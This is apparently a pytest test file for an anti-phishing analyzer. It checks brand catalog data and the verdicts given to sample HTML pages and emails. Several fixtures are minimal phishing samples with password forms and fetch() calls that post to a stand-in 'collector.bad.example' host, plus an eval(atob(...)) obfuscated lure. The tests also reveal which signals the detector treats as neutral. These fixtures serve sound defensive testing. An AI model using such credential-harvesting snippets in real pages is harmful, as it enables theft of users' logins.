from __future__ import annotations

import sqlite3
import json

from antiphish.analyzer import Analyzer
from antiphish.config import RESOURCE_DIR
from antiphish.models import AnalysisStatus, Verdict


def test_active_brand_catalog_is_curated_and_well_formed():
    brands = json.loads((RESOURCE_DIR / "brands.json").read_text(encoding="utf-8"))["brands"]
    assert len([item for item in brands if item.get('active')]) >= 100
    assert len({item["name"].casefold() for item in brands}) == len(brands)
    for item in brands:
        if item.get('active'):
            assert item["domains"]
            assert len(item["references"]) >= 2
        else:
            assert not item['domains']
        assert all(domain == domain.casefold().strip(".") and "://" not in domain for domain in item["domains"])


def test_unknown_brand_composite_is_phishing(empty_kb):
    body = b"""<html><body><form action='https://collector.bad.example/x'>
    <input name='login'><input type='password' name='password'></form>
    <script>fetch('https://collector.bad.example/x',{method:'POST'})</script>
    <a href='https://collector.bad.example'>https://portal.corp.example/login</a></body></html>"""
    report = Analyzer(empty_kb).analyze(body, name="unknown.html")
    assert report.verdict == Verdict.PHISHING
    assert {"SENSITIVE_FORM", "PHISHING_FORM_ROUTE", "DISPLAY_HREF_MISMATCH"} <= {e.code for e in report.reason_codes}
    assert "SCRIPT_EXFILTRATION" not in {e.code for e in report.reason_codes}  # no field reads


def test_brand_newsletter_tracking_link_is_not_a_mismatch(empty_kb):
    body = b"<html><body>Microsoft newsletter <form action='https://tracker.vendor.example/search'><input name='q'></form><a href='https://tracker.vendor.example/story'>News</a></body></html>"
    report = Analyzer(empty_kb).analyze(body, name="newsletter.html")
    assert "BRAND_DOMAIN_MISMATCH" not in {e.code for e in report.reason_codes}
    assert report.verdict == Verdict.NOT_DETECTED


def test_payment_words_alone_do_not_raise_verdict(empty_kb):
    eml = "From: accounting@corp.ru\nTo: user@corp.ru\nSubject: Срочный счет на оплату\n\nОплатите по согласованным реквизитам.".encode()
    report = Analyzer(empty_kb).analyze(eml, name="invoice.eml")
    assert report.verdict == Verdict.NOT_DETECTED
    assert "BEC_PAYMENT_REQUEST" in {e.code for e in report.reason_codes}


def test_reply_to_mismatch_alone_does_not_raise_verdict(empty_kb):
    eml = b"From: sender@corp.ru\nReply-To: ticket@support.example\nSubject: Hello\n\nMeeting notes"
    assert Analyzer(empty_kb).analyze(eml, name="forward.eml").verdict == Verdict.NOT_DETECTED


def test_password_expiry_lure_is_review_not_block(empty_kb):
    body = b"<html><body>Your account password expires today. Keep same password: <a href='https://files.example/x'>continue</a></body></html>"
    report = Analyzer(empty_kb).analyze(body, name="expiry.html")
    assert report.verdict == Verdict.SUSPICIOUS
    assert "CREDENTIAL_LURE" in {e.code for e in report.reason_codes}


def test_captcha_and_ordinary_network_activity_are_neutral(empty_kb):
    body = b"<html><body>Verify you are human CAPTCHA<script>fetch('https://gate.example/api'); location='https://gate.example/x'</script></body></html>"
    report = Analyzer(empty_kb).analyze(body, name="gate.html")
    assert report.verdict == Verdict.NOT_DETECTED
    assert "ACTIVE_CLOAKING" not in {e.code for e in report.reason_codes}


def test_obfuscation_requires_lure_context(empty_kb):
    ordinary = b"<html><script>eval('console.log(1)')</script><a href='https://cdn.example/a'>asset</a></html>"
    assert Analyzer(empty_kb).analyze(ordinary, name="app.html").verdict == Verdict.NOT_DETECTED
    lure = b"<html><body>Confirm password<script>eval(atob('YQ=='))</script><a href='https://gate.example/x'>continue</a></body></html>"
    assert Analyzer(empty_kb).analyze(lure, name="lure.html").verdict == Verdict.SUSPICIOUS


def test_model_signal_never_blocks(empty_kb, monkeypatch):
    monkeypatch.setattr("antiphish.analyzer.optional_deep_analysis", lambda text, **kwargs: ([{"model": "fixture", "suspicious": True}], []))
    report = Analyzer(empty_kb).analyze(b"ordinary text", name="mail.txt", profile="deep")
    assert report.verdict == Verdict.NOT_DETECTED
    assert "MODEL_SUSPICION" in {e.code for e in report.reason_codes}


def test_failed_optional_model_does_not_downgrade_static_phishing(empty_kb, monkeypatch):
    monkeypatch.setattr("antiphish.analyzer.optional_deep_analysis", lambda text, **kwargs: ([], ["fixture model unavailable"]))
    body = b"<form action='https://collector.bad.example'><input type=password></form><script>fetch('https://collector.bad.example')</script><a href='https://collector.bad.example'>https://portal.example</a>"
    report = Analyzer(empty_kb).analyze(body, name="phish.html", profile="deep")
    assert report.verdict == Verdict.PHISHING
    assert report.analysis_status == AnalysisStatus.PARTIAL
    assert report.configuration['static_analysis_status'] == 'COMPLETE'
    assert report.model_warnings == ["fixture model unavailable"]


def test_exact_ioc_blocks_even_if_parser_partial(empty_kb):
    data = b"%PDF-malformed"
    import hashlib
    digest = hashlib.sha256(data).hexdigest()
    with sqlite3.connect(empty_kb) as con:
        con.execute("INSERT INTO known_hashes VALUES(?,?,?,?,?,?,?)", (digest, "pdf", "PHISHING", "unit-test", None, None, "confirmed"))
    report = Analyzer(empty_kb).analyze(data, name="bad.pdf")
    assert report.analysis_status == AnalysisStatus.PARTIAL
    assert report.verdict == Verdict.PHISHING


def test_partial_composite_is_capped_at_suspicious(empty_kb, monkeypatch):
    body = b"<html><form action='https://bad.example'><input type=password></form><script>fetch('https://bad.example')</script><a href='https://bad.example'>https://good.example</a></html>"
    monkeypatch.setattr("antiphish.analyzer.extract_any", lambda *a, **k: _partial_extract(body))
    report = Analyzer(empty_kb).analyze(body, name="x.html")
    assert report.analysis_status == AnalysisStatus.PARTIAL
    assert report.verdict == Verdict.SUSPICIOUS


def _partial_extract(body):
    from antiphish.config import DEFAULT_LIMITS
    from antiphish.extractors import extract_html
    result = extract_html(body, DEFAULT_LIMITS)
    result.warnings.append("fixture partial")
    for page in result.pages:
        page.complete = False
    return result
